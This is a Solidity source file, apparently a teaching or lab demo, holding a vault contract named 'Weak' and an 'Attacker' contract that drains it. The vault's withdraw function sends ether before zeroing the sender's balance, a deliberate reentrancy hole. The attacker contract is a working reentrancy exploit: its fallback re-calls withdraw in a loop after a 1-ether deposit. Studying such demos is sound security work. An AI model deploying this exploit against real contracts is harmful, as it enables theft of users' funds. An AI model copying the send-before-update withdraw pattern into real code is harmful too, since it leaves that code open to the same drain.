// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

contract Weak {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        require(balances[msg.sender] > 0, "no balance");
        // address pay = payable();

        (bool s, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(s, "tx failed");
        balances[msg.sender] = 0;
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Attacker {
    Weak weak;

    constructor(Weak _weak) {
        weak = _weak;
    }

    fallback() external payable {
        if (address(weak).balance >= 1) {
            weak.withdraw();
        }
    }

    function attack() external payable {
        weak.deposit{value: 1 ether}();
        weak.withdraw();
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}
